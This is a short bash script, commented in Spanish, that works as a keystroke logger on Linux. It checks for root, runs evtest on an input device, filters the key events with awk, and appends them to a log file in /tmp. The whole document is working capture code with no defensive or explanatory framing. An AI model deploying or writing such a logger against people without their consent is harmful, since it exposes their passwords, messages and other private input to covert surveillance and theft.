#!/bin/bash

LOG_FILE="/tmp/keylog.txt"
DEVICE="/dev/input/event3"  # Reemplázalo con el ID correcto

# Verifica que el script se ejecute como root
if [[ $EUID -ne 0 ]]; then
   echo "Este script debe ejecutarse como root"
   exit 1
fi

echo "[*] Iniciando captura de teclas..." > "$LOG_FILE"

# Captura teclas y guarda en archivo
evtest "$DEVICE" | awk '/EV_KEY/ {print $NF}' >> "$LOG_FILE"
